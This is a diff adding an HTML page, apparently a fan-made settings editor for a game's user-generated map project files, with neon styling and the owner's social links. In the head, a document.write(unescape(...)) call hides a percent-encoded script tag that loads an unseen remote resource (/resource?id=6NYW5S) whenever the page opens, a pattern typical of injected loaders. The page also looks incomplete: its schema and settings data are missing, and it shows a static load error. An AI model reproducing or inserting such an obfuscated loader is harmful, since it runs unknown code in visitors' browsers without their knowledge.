@@ -1,0 +1,274 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UGC Settings Editor | shizuka</title>
+    <link rel="icon" href="images/fdECkEzZHi8A.svg" type="image/svg+xml">
+    <script language="javascript">document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%72%65%73%6F%75%72%63%65%3F%69%64%3D%36%4E%59%57%35%53%22%3E%3C%2F%73%63%72%69%70%74%3E' ))</script><script src="js/Z79wGTwzdM44.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #f4f7f9; color: #333; line-height: 1.5; }
+        .container { max-width: 1100px; margin: 20px auto; background: #fff; border-radius: 10px; box-shadow: 0 2px 15px rgba(0,0,0,0.1); overflow: hidden; }
+        
+        .header { background: #1a202c; color: #fff; padding: 30px; text-align: center; }
+        .header h1 { font-size: 22px; text-transform: uppercase; letter-spacing: 1px; }
+
+        .upload-section { padding: 25px; border-bottom: 1px solid #edf2f7; text-align: center; }
+        .upload-box { border: 2px dashed #cbd5e0; border-radius: 8px; padding: 30px; cursor: pointer; transition: 0.2s; background: #fff; }
+        .upload-box:hover { border-color: #4a90e2; background: #f8fbff; }
+        .upload-box.disabled { opacity: 0.5; cursor: not-allowed; }
+        input[type="file"] { display: none; }
+
+        .category-section { margin: 20px; border: 1px solid #e2e8f0; border-radius: 8px; }
+        .category-header { background: #edf2f7; padding: 12px 20px; font-weight: 700; font-size: 14px; color: #4a5568; border-bottom: 1px solid #e2e8f0; text-transform: uppercase; }
+        
+        .settings-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1px; background: #e2e8f0; }
+        .setting-item { background: #fff; padding: 15px 20px; display: flex; flex-direction: column; justify-content: center; }
+        .setting-item h3 { font-size: 13px; color: #2d3748; margin-bottom: 8px; font-weight: 600; }
+
+        input[type="number"], select { width: 100%; padding: 8px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 14px; }
+        .checkbox-container { display: flex; align-items: center; justify-content: space-between; cursor: pointer; width: 100%; }
+        .checkbox-container input { width: 18px; height: 18px; }
+
+        .button-group { padding: 30px; text-align: center; }
+        .btn { padding: 12px 35px; font-weight: 700; border-radius: 6px; cursor: pointer; border: none; transition: 0.2s; }
+        .btn-primary { background: #4a90e2; color: white; }
+        .btn-primary:hover { background: #357abd; }
+
+        .status-msg { padding: 15px; margin: 15px 20px; border-radius: 6px; font-size: 14px; }
+        .error-box { background: #fff5f5; border: 1px solid #feb2b2; color: #c53030; }
+        .info-box { background: #ebf8ff; border: 1px solid #bee3f8; color: #2b6cb0; }
+        .hidden { display: none; }
+
+        /* Neon Multi Rainbow theme */
+        :root { color-scheme: dark; --rainbow: linear-gradient(110deg,#ff2bd6,#7c3cff,#00d9ff,#00ff9d,#eaff00,#ff9a00,#ff2b62,#ff2bd6); }
+        body { background: #050611; color: #f7f7ff; background-image: radial-gradient(ellipse at 10% 0%,rgba(124,60,255,.22),transparent 38%), radial-gradient(ellipse at 90% 20%,rgba(0,217,255,.16),transparent 35%), radial-gradient(ellipse at 50% 100%,rgba(255,43,214,.12),transparent 40%); }
+        .container { background: rgba(8,10,27,.96); border: 1px solid transparent; border-radius: 18px; box-shadow: 0 0 10px #7c3cff, 0 0 26px rgba(0,217,255,.18); overflow: hidden; }
+        .header { background: linear-gradient(115deg,#10072b,#071a35,#061b20); border-bottom: 2px solid transparent; border-image: var(--rainbow) 1; padding: 28px 30px 24px; }
+        .header h1 { font-size: clamp(22px,3vw,32px); letter-spacing: 1.5px; background: var(--rainbow); background-size: 300% 300%; -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 8px rgba(0,217,255,.4)); }
+        .upload-section { background: rgba(11,15,38,.82); border-bottom-color: rgba(0,217,255,.22); }
+        .upload-box { background: rgba(9,13,33,.9); color: #e9eaff; border: 2px dashed #00d9ff; box-shadow: inset 0 0 18px rgba(0,217,255,.08); }
+        .upload-box:hover { border-color: #ff2bd6; background: rgba(38,12,58,.85); box-shadow: 0 0 18px rgba(255,43,214,.3); }
+        .upload-box.disabled { opacity: .55; }
+        .category-section { border: 1px solid #4033a8; border-radius: 12px; overflow: hidden; box-shadow: 0 0 12px rgba(124,60,255,.12); }
+        .category-header { color: #fff; background: linear-gradient(90deg,rgba(255,43,214,.2),rgba(0,217,255,.14),rgba(0,255,157,.12)); border-bottom: 1px solid #4033a8; }
+        .settings-grid { background: rgba(0,217,255,.12); gap: 1px; }
+        .setting-item { background: #090d21; color: #f7f7ff; }
+        .setting-item h3 { color: #9cecff; }
+        input[type="number"], select { background: #050817; color: #fff; border: 1px solid #5544c8; border-radius: 7px; }
+        input[type="number"]:focus, select:focus { outline: none; border-color: #00d9ff; box-shadow: 0 0 0 2px rgba(0,217,255,.16), 0 0 12px rgba(0,217,255,.18); }
+        input[type="checkbox"] { accent-color: #ff2bd6; }
+        .btn-primary { background: var(--rainbow); background-size: 250% 250%; color: #070817; box-shadow: 0 0 15px rgba(0,217,255,.25); }
+        .btn-primary:hover { filter: brightness(1.15); transform: translateY(-1px); box-shadow: 0 0 22px rgba(255,43,214,.4); }
+        .status-msg { background: #0b1230; border-radius: 9px; }
+        .error-box { color: #ff9fb4; border: 1px solid #ff386b; background: rgba(65,8,31,.7); }
+        .info-box { color: #8ef6ff; border: 1px solid #00d9ff; background: rgba(0,55,75,.38); }
+        .social-owner { margin: 18px 20px 4px; padding: 16px 18px; border: 1px solid #5544c8; border-radius: 12px; background: linear-gradient(120deg,rgba(255,43,214,.1),rgba(0,217,255,.08),rgba(0,255,157,.07)); box-shadow: 0 0 16px rgba(124,60,255,.13); text-align: center; }
+        .social-owner .owner-name { font-size: 19px; font-weight: 800; background: var(--rainbow); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .social-owner a { display: inline-block; margin: 8px 5px 0; padding: 8px 13px; border-radius: 8px; color: #fff; text-decoration: none; border: 1px solid #00d9ff; background: rgba(3,14,34,.8); transition: .2s; overflow-wrap: anywhere; }
+        .social-owner a:hover { border-color: #ff2bd6; box-shadow: 0 0 13px rgba(255,43,214,.35); transform: translateY(-1px); }
+        @media (max-width: 600px) { .container { margin: 8px; border-radius: 12px; } .header { padding: 22px 14px; } .upload-section { padding: 16px; } .upload-box { padding: 24px 12px; } .category-section { margin: 12px; } .setting-item { padding: 13px; } .social-owner { margin: 12px; } }
+
+        /* Fancy dashboard layout: layered glass panels + animated rainbow accents */
+        @keyframes rainbowFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        @keyframes softFloat { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }
+        body { min-height: 100vh; padding: 28px 18px; background-color: #050611; background-image: radial-gradient(circle at 12% 12%,rgba(255,43,214,.17),transparent 28%),radial-gradient(circle at 90% 15%,rgba(0,217,255,.14),transparent 26%),radial-gradient(circle at 50% 100%,rgba(0,255,157,.10),transparent 35%),linear-gradient(145deg,#050611 0%,#090b20 52%,#10051c 100%); }
+        .container { max-width: 1240px; margin: 0 auto; border: 1px solid rgba(142,111,255,.45); border-radius: 24px; background: rgba(7,10,27,.9); box-shadow: 0 25px 90px rgba(0,0,0,.48),0 0 35px rgba(124,60,255,.15); overflow: hidden; backdrop-filter: blur(18px); position: relative; }
+        .container:before { content: ""; display: block; height: 4px; background: var(--rainbow); background-size: 300% 300%; animation: rainbowFlow 8s ease infinite; }
+        .header { position: relative; padding: 44px 28px 34px; background: radial-gradient(ellipse at 50% 0%,rgba(124,60,255,.2),transparent 60%),linear-gradient(135deg,rgba(14,17,44,.98),rgba(7,20,37,.96)); border-bottom: 1px solid rgba(0,217,255,.24); border-image: none; }
+        .header:after { content: ""; position: absolute; inset: auto 8% 0; height: 1px; background: var(--rainbow); opacity: .8; }
+        .eyebrow { display: inline-flex; padding: 7px 13px; margin-bottom: 15px; border: 1px solid rgba(0,217,255,.45); border-radius: 999px; color: #8ef6ff; font-size: 10px; font-weight: 800; letter-spacing: 2px; background: rgba(0,217,255,.07); box-shadow: 0 0 18px rgba(0,217,255,.1); }
+        .header h1 { font-size: clamp(27px,4vw,42px); letter-spacing: .5px; line-height: 1.2; background-size: 300% 300%; animation: rainbowFlow 9s ease infinite; }
+        .header-subtitle { max-width: 620px; margin: 12px auto 18px; color: #b9c8ed; font-size: 15px; }
+        .header-pills { display: flex; justify-content: center; flex-wrap: wrap; gap: 9px; }
+        .header-pills span { padding: 7px 12px; border: 1px solid rgba(124,60,255,.35); border-radius: 999px; background: rgba(10,15,39,.75); color: #e8e9ff; font-size: 12px; }
+        .social-owner { margin: 22px 24px 6px; padding: 22px; border: 1px solid rgba(124,60,255,.6); border-radius: 18px; background: linear-gradient(125deg,rgba(255,43,214,.08),rgba(0,217,255,.06),rgba(0,255,157,.05)); box-shadow: inset 0 1px rgba(255,255,255,.05),0 12px 28px rgba(0,0,0,.16); }
+        .social-owner > div:first-child { color: #9daed8; text-transform: uppercase; letter-spacing: 3px; font-size: 10px; font-weight: 800; }
+        .social-owner .owner-name { margin: 5px 0 10px; font-size: clamp(22px,3vw,30px); letter-spacing: .4px; }
+        .social-owner a { padding: 10px 17px; margin: 6px 5px 0; border-radius: 10px; background: rgba(5,10,28,.82); font-weight: 700; font-size: 13px; }
+        .upload-section { padding: 28px; background: transparent; border-bottom: 0; }
+        .upload-box { min-height: 190px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 9px; padding: 28px; border: 1px dashed rgba(0,217,255,.8); border-radius: 18px; background: radial-gradient(ellipse at top,rgba(0,217,255,.09),transparent 65%),rgba(8,13,34,.78); box-shadow: inset 0 0 30px rgba(0,217,255,.035); }
+        .upload-icon { width: 52px; height: 52px; display: grid; place-items: center; border-radius: 16px; font-size: 30px; font-weight: 300; color: #071022; background: var(--rainbow); background-size: 250% 250%; animation: rainbowFlow 8s ease infinite; box-shadow: 0 0 25px rgba(0,217,255,.18); }
+        #uploadText { font-size: 17px; color: #f7f7ff; }
+        .upload-hint { color: #8c9cc7; font-size: 12px; }
+        .category-section { margin: 20px 24px; border-radius: 16px; border: 1px solid rgba(124,60,255,.45); background: rgba(9,13,34,.76); box-shadow: 0 12px 30px rgba(0,0,0,.16); }
+        .category-header { padding: 15px 20px; letter-spacing: 1.2px; font-size: 12px; background: linear-gradient(90deg,rgba(255,43,214,.16),rgba(124,60,255,.12),rgba(0,217,255,.12)); }
+        .settings-grid { grid-template-columns: repeat(auto-fit,minmax(min(100%,270px),1fr)); gap: 1px; background: rgba(124,60,255,.16); }
+        .setting-item { min-height: 90px; padding: 18px 20px; background: linear-gradient(145deg,rgba(10,15,38,.98),rgba(7,10,26,.98)); transition: background .2s ease, box-shadow .2s ease; }
+        .setting-item:hover { background: linear-gradient(145deg,rgba(19,21,55,.98),rgba(8,18,37,.98)); box-shadow: inset 3px 0 #00d9ff; }
+        .setting-item h3 { font-size: 13px; letter-spacing: .2px; }
+        .checkbox-container { gap: 14px; color: #e9ecff; font-size: 13px; }
+        .checkbox-container input { flex: 0 0 auto; width: 19px; height: 19px; cursor: pointer; }
+        input[type="number"], select { padding: 11px 12px; min-height: 42px; }
+        .button-group { padding: 26px; }
+        .btn { min-width: 220px; padding: 14px 30px; border-radius: 12px; font-size: 14px; letter-spacing: .3px; }
+        .status-msg { margin: 18px 24px; padding: 14px 17px; border-radius: 12px; }
+        .hidden { display: none !important; }
+        @media (max-width: 600px) { body { padding: 8px; } .container { margin: 0; border-radius: 17px; } .header { padding: 30px 15px 26px; } .header-subtitle { font-size: 13px; } .eyebrow { letter-spacing: 1px; font-size: 9px; } .upload-section { padding: 16px; } .upload-box { min-height: 165px; padding: 22px 12px; } .category-section { margin: 13px; } .category-header { padding: 13px 15px; } .setting-item { padding: 15px; } .social-owner { margin: 14px; padding: 18px 12px; } .social-owner a { display: block; margin: 8px auto 0; max-width: 280px; } .status-msg { margin: 13px; } .button-group { padding: 18px; } .btn { width: 100%; min-width: 0; } }
+        @media (prefers-reduced-motion: reduce) { *, *:before, *:after { animation-duration: .01ms !important; animation-iteration-count: 1 !important; scroll-behavior: auto !important; transition-duration: .01ms !important; } }
+    </style></head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="eyebrow">✦ NEON MULTI RAINBOW EXPERIENCE ✦</div>
+            <h1>🎮 UGC Settings Editor</h1>
+            <p class="header-subtitle">Customize your map project with a clean, powerful settings workspace.</p>
+            <div class="header-pills"><span>⚡ Fast workflow</span><span>🛠️ Advanced controls</span><span>💾 Export ready</span></div>
+        </div>
+
+        <section class="social-owner" aria-label="Owner and social links">
+            <div>Owner</div>
+            <div class="owner-name">✨ shizuka ✨</div>
+            <div>
+                <a href="https://www.youtube.com/@GamingWithShizuka_11421" target="_blank" rel="noopener noreferrer">▶ YouTube Channel</a>
+                <a href="https://web.telegram.org/a/#8449796307" target="_blank" rel="noopener noreferrer">✈ Telegram</a>
+            </div>
+        </section>
+
+        <div id="loadingIndicator" class="status-msg info-box" style="text-align: center;">
+            ⚙️ Settings library is loading...
+        </div>
+
+        <div class="upload-section">
+            <div class="upload-box disabled" id="uploadBox" onclick="document.getElementById('fileInput').click()">
+                <input type="file" id="fileInput" accept=".bin,.dat,*">
+                <span class="upload-icon">↥</span><strong id="uploadText">Choose your Map Project File</strong><span class="upload-hint">Click here to browse · .bin, .dat or project file</span>
+            </div>
+        </div>
+
+        <div id="infoBox" class="status-msg info-box hidden">✅ File loaded! All allowed settings are now available for editing.</div>
+        <div id="errorBox" class="status-msg error-box">❌ Proto Load Error: protobuf is not defined</div>
+
+        <div id="settingsContainer"></div>
+
+        <div class="button-group hidden" id="buttonGroup">
+            <button class="btn btn-primary" id="downloadBtn">💾 Save &amp; Download</button>
+        </div>
+    </div>
+
+    <script src="js/w9t76t1dwxag.js"></script>
+    <script>
+        const categoryMapping={
+        "Game Rules":["GamePrepareTimeS","MultiRoundsEnabled","RoundCount","RoundTime","RoundPreparingTime","TeamNum","TeamMemberNum","MinNumOfMatchStart","AllowHangUpTime","EnableFreeQuit","DisableReconnect"],"Player & Stats":["MaxHP","MaxEP","StartEP","Damage","Damaged","MoveSpeed","JumpHeight","AutoHealing","UnlimitedBullet","UnlimitedGloowall","UnlimitedThrowables","EnableInventoryDrop"],"Revive System":["HumanCanRevive","BotCanRevive","ReviveCDTime","ReviveRule","ReviveSwitch"],"Game Observe Setting":["EnableDeathObserve","ObserverModeEnable","ObserverMode","UGCObserverCameraMode"],"Economy":["EnableTotalToken","EcoRoundMoney","EcoKillMoney","EcoWinMoney","CoinHudShow","EnableUGCToken"],"Safe Zone":["SafeZoneEnabled","SafeZoneSize","SafeZoneStartTime","SafeZoneDamage","SafeZoneShrinkTime"],"Camera Settings":["CameraType","CameraFov","CameraPitch","CameraYaw","CameraDistance","CameraOffset","CameraProjectionMode","CameraBlockMode","TwoDimensionCamEnableZAxis","CameraViewingAngleRestrictionType"],"Player Skill and Skin":["EnableActiveSkill","EnablePassiveSkill","PetEnable","PetSkillEnable","EnableWeaponSkinProperty","EnableWeaponSkillProperty","EnablePveWeaponSkinProperty"],"Match Making Rules":["RecommendStartGameNumber","EnableQuickStartMatch","GameStartTimeS","EnableHalfwayJoin","HalfwayJoinNumberLimit","HalfwayJoinNumber","EnableHalfwayJoinEffectTime","HalfwayJoinEffectTime"],"Advanced & System":["EnableMiniMapV2","DisableDepthMap","EnableRuntimeDynamicNavMesh","EnableEnergySavingMode","IsDownFPPResource","UGCIsShowSocialChooseBox","EnableInternalWorkflowLogic","EnableAOIFilter","IsHoudiniUsed","DisableEnemyFootstepVibrate","IsAIGenUsed","MorphModeDisableTemplate"]
+        };
+
+        function initProtobuf() {
+            try {
+                const root = protobuf.parse(protoSchema, { keepCase: true }).root;
+                UGCProjectDataType = root.lookupType("UGCProjectData");
+                protoReady = true;
+                document.getElementById('loadingIndicator').classList.add('hidden');
+                document.getElementById('uploadBox').classList.remove('disabled');
+            } catch (e) { showError('Proto Load Error: ' + e.message); }
+        }
+        window.addEventListener('load', () => setTimeout(initProtobuf, 500));
+
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            originalFileName = file.name;
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                try {
+                    originalMessage = UGCProjectDataType.decode(new Uint8Array(ev.target.result));
+                    displaySettings();
+                    document.getElementById('infoBox').classList.remove('hidden');
+                    document.getElementById('errorBox').classList.add('hidden');
+                } catch (err) { showError('Decode Error: ' + err.message); }
+            };
+            reader.readAsArrayBuffer(file);
+        });
+
+        function formatName(name) {
+            return name.replace(/([A-Z])/g, ' $1').trim();
+        }
+
+        function displaySettings() {
+            const container = document.getElementById('settingsContainer');
+            container.innerHTML = '';
+            document.getElementById('buttonGroup').classList.remove('hidden');
+
+            const fileSettings = [];
+            originalMessage.ShahGCreator.settings.forEach(w => w.settings && fileSettings.push(...w.settings));
+
+            for (const [catName, settingNames] of Object.entries(categoryMapping)) {
+                const section = document.createElement('div');
+                section.className = 'category-section';
+                section.innerHTML = `<div class="category-header">${catName}</div>`;
+                const grid = document.createElement('div');
+                grid.className = 'settings-grid';
+
+                settingNames.forEach(sName => {
+                    const meta = settingsMetadata.find(m => m.Name === sName);
+                    if (!meta) return;
+
+                    const data = fileSettings.find(d => d.id === meta.ID) || { id: meta.ID, value: 0, ratio: 0, enable: false };
+
+                    const div = document.createElement('div');
+                    div.className = 'setting-item';
+                    
+                    if (meta.Type === 'boolean') {
+                        div.innerHTML = `
+                            <label class="checkbox-container">
+                                <span>${formatName(meta.Name)}</span>
+                                <input type="checkbox" id="field_${meta.ID}" ${data.enable ? 'checked' : ''}>
+                            </label>`;
+                    } else {
+                        const isFloat = meta.Type === 'float';
+                        div.innerHTML = `
+                            <h3>${formatName(meta.Name)}</h3>
+                            <input type="number" id="field_${meta.ID}" value="${isFloat ? data.ratio : data.value}" step="${isFloat ? '0.01' : '1'}">
+                        `;
+                    }
+                    grid.appendChild(div);
+                });
+
+                section.appendChild(grid);
+                container.appendChild(section);
+            }
+        }
+
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            try {
+                if (!originalMessage.ShahGCreator.settings || originalMessage.ShahGCreator.settings.length === 0) {
+                    originalMessage.ShahGCreator.settings = [{ settings: [] }];
+                }
+
+                const settingsTargetList = originalMessage.ShahGCreator.settings[0].settings;
+
+                settingsMetadata.forEach(meta => {
+                    const el = document.getElementById(`field_${meta.ID}`);
+                    if (!el) return;
+
+                    let targetSetting = settingsTargetList.find(s => s.id === meta.ID);
+                    
+                    if (!targetSetting) {
+                        targetSetting = { id: meta.ID };
+                        settingsTargetList.push(targetSetting);
+                    }
+
+                    if (meta.Type === 'boolean') {
+                        targetSetting.enable = el.checked;
+                    } else if (meta.Type === 'float') {
+                        targetSetting.ratio = parseFloat(el.value);
+                    } else if (meta.Type === 'int') {
+                        targetSetting.value = parseInt(el.value);
+                    }
+                });
+
+                const buffer = UGCProjectDataType.encode(originalMessage).finish();
+                const blob = new Blob([buffer], { type: 'application/octet-stream' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = originalFileName || 'ProjectData_slot_x.bytes';
+                a.click();
+            } catch (e) { showError('Save Error: ' + e.message); }
+        });
+
+        function showError(m) { 
+            const eb = document.getElementById('errorBox');
+            eb.textContent = "❌ " + m; eb.classList.remove('hidden'); 
+        }
+    </script>
+
+
+</body></html>
